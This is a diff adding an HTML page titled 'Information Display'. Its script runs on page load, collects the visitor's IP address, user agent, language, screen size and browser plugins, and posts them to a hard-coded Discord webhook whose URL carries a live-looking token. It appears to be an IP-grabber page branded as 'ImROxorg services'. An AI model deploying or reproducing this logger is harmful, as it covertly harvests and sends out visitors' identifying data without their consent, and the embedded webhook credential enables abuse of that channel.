@@ -1,0 +1,150 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Information Display</title>
+    <style>
+        body {
+            font-family: 'Arial', sans-serif;
+            background: #2C3E50;
+            color: #ECF0F1;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .container {
+            background: #34495E;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+            position: relative;
+        }
+        h1, h2 {
+            color: #1ABC9C;
+        }
+        p {
+            margin: 10px 0;
+        }
+        #statusMessage {
+            margin-top: 20px;
+            padding: 10px;
+            background: #1ABC9C;
+            border-radius: 4px;
+            text-align: center;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Information Display</h1>
+        <div>
+            <p><strong>IP Address:</strong> <span id="ip"></span></p>
+            <p><strong>Timestamp:</strong> <span id="timestamp"></span></p>
+        </div>
+        <h2>Browser Information</h2>
+        <div>
+            <p><strong>User Agent:</strong> <span id="userAgent"></span></p>
+            <p><strong>Language:</strong> <span id="language"></span></p>
+            <p><strong>Screen Width:</strong> <span id="screenWidth"></span></p>
+            <p><strong>Screen Height:</strong> <span id="screenHeight"></span></p>
+        </div>
+        <h2>Plugins</h2>
+        <div>
+            <p><strong>Plugins:</strong> <span id="plugins"></span></p>
+        </div>
+        <div>
+            <p id="statusMessage"></p>
+        </div>
+    </div>
+
+    <script>
+        // Predefined Discord webhook URL
+        const webhookUrl = 'https://discord.com/api/webhooks/1227716527600570388/paQ37DVW3vW4W2LzpdaJJQZu9OUd-C5DAH0uyYH96NFGdZU47WOV6AdAvDPB_03iaOP0';
+
+        // Get and display the timestamp
+        const currentDate = new Date();
+        const formattedDate = `${String(currentDate.getDate()).padStart(2, '0')}/${String(currentDate.getMonth() + 1).padStart(2, '0')}/${currentDate.getFullYear()} ${String(currentDate.getHours()).padStart(2, '0')}:${String(currentDate.getMinutes()).padStart(2, '0')}:${String(currentDate.getSeconds()).padStart(2, '0')}`;
+        document.getElementById('timestamp').textContent = formattedDate;
+
+        // Get and display the user agent
+        const userAgent = navigator.userAgent;
+        document.getElementById('userAgent').textContent = userAgent;
+
+        // Get and display the language
+        const language = navigator.language || navigator.userLanguage;
+        document.getElementById('language').textContent = language;
+
+        // Get and display the screen width and height
+        const screenWidth = screen.width;
+        const screenHeight = screen.height;
+        document.getElementById('screenWidth').textContent = screenWidth;
+        document.getElementById('screenHeight').textContent = screenHeight;
+
+        // Get and display the plugins
+        let plugins = [];
+        for (let i = 0; i < navigator.plugins.length; i++) {
+            plugins.push(navigator.plugins[i].name);
+        }
+        document.getElementById('plugins').textContent = plugins.join(', ');
+
+        // Fetch and display the IP address
+        fetch('https://api.ipify.org?format=json')
+            .then(response => response.json())
+            .then(data => {
+                const ipAddress = data.ip;
+                document.getElementById('ip').textContent = ipAddress;
+
+                // Prepare the message payload
+                const messagePayload = {
+                    embeds: [{
+                        title: "User Information",
+                        color: 15158332, // Red color
+                        fields: [
+                            { name: "IP Address", value: ipAddress, inline: true },
+                            { name: "Timestamp", value: formattedDate, inline: true },
+                            { name: "User Agent", value: userAgent },
+                            { name: "Language", value: language, inline: true },
+                            { name: "Screen Width", value: screenWidth.toString(), inline: true },
+                            { name: "Screen Height", value: screenHeight.toString(), inline: true },
+                            { name: "Plugins", value: plugins.join(', ') || 'None' }
+                        ],
+                        footer: {
+                            text: "Thanks for choosing ImROxorg services!"
+                        },
+                        thumbnail: {
+                            url: "https://i.postimg.cc/YC0zL8Yr/24395d1f5deadbd5f896dc9ece75cf20.jpg"
+                        }
+                    }]
+                };
+
+                // Send the information to the Discord webhook
+                fetch(webhookUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(messagePayload)
+                })
+                .then(response => {
+                    if (response.ok) {
+                        document.getElementById('statusMessage').textContent = 'All the information has been sent to the predefined webhook.';
+                    } else {
+                        document.getElementById('statusMessage').textContent = 'Failed to send the information to the webhook.';
+                    }
+                })
+                .catch(error => {
+                    console.error('Error sending to webhook:', error);
+                    document.getElementById('statusMessage').textContent = 'Error sending the information to the webhook.';
+                });
+            })
+            .catch(error => {
+                console.error('Error fetching IP address:', error);
+                document.getElementById('ip').textContent = 'Error fetching IP';
+                document.getElementById('statusMessage').textContent = 'Error fetching IP address, unable to send the information to the webhook.';
+            });
+    </script>
+</body>
+</html>
